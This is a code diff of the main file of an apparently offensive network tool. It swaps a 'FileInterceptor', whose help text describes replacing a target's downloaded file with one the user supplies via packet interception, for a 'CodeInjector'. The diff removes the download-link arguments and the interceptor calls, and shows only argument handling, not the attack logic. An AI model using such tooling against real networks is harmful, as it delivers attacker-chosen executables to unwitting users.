@@ -1,4 +1,4 @@
-#include "FileInterceptor.h"
+#include "CodeInjector.h"
 
 #include <iostream>
 
@@ -18,15 +18,13 @@ void PrintHelp(char** argv)
         << "<ip version>: ip version of the target, must be 4 or 6\n"
         << "<queueNum>: nft queue number used to capture packets\n"
         << "<target ip>: target whose file you wish to intercept\n"
-        << "<download link>: file you wish to replace WITHOUT the http:// prefix\n"
-        << "<new download link>: the path to the file you want the target to download WITH the http:// prefix\n\n"
-        << "Example: " << argv[0] << " eth0 "<< "4 " << "10.0.2.4 " << " 0 " << " download.example.co/testfile.exe " << "http://10.0.2.15/test_program.exe\n"
-        << "note: due to limitiations in the program, new download link should be equal or shorter in length than the download link" << std::endl;
+        << "<download link>: file you wish to replace\n"
+        << "<new download link>: the path to the file you want the target to download\n\n"
+        << "Example: " << argv[0] << " eth0 "<< "4 " << "10.0.2.4 " << " 0 " << " download.example.co/testfile.exe " << "10.0.2.15/test_program.exe" << std::endl;
 }
 
 // TODO: improve args processing
-int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion, uint32_t& queueNum, char* targetIP, 
-    char* downloadLink, char* newDownloadLink)
+int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion, uint32_t& queueNum, char* targetIP)
 {
     if((argc == 2) && (PacketCraft::CompareStr(argv[1], "?") == TRUE))
     {
@@ -52,8 +50,6 @@ int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion,
     queueNum = atoi(argv[3]);
 
     PacketCraft::CopyStr(targetIP, INET6_ADDRSTRLEN, argv[4]);
-    PacketCraft::CopyStr(downloadLink, DOWNLOAD_LINK_STR_SIZE, argv[5]);
-    PacketCraft::CopyStr(newDownloadLink, DOWNLOAD_LINK_STR_SIZE, argv[6]);
 
     return NO_ERROR;
 }
@@ -64,26 +60,11 @@ int main(int argc, char** argv)
     uint32_t ipVersion{};
     uint32_t queueNum{};
     char targetIPStr[INET6_ADDRSTRLEN]{};
-    char downloadLink[DOWNLOAD_LINK_STR_SIZE]{};
-    char newDownloadLink[DOWNLOAD_LINK_STR_SIZE]{};
 
-    if(ProcessArgs(argc, argv, interfaceName, ipVersion, queueNum, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
+    if(ProcessArgs(argc, argv, interfaceName, ipVersion, queueNum, targetIPStr) == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "ProcessArgs() error!");
         PrintHelp(argv);
-        return APPLICATION_ERROR;
-    }
-
-    CHaks::FileInterceptor fileInterceptor;
-    if(fileInterceptor.Init(ipVersion, interfaceName, targetIPStr, downloadLink, newDownloadLink, queueNum) == APPLICATION_ERROR)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Init() error");
-        return APPLICATION_ERROR;
-    }
-
-    if(fileInterceptor.Run() == APPLICATION_ERROR)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
         return APPLICATION_ERROR;
     }
 
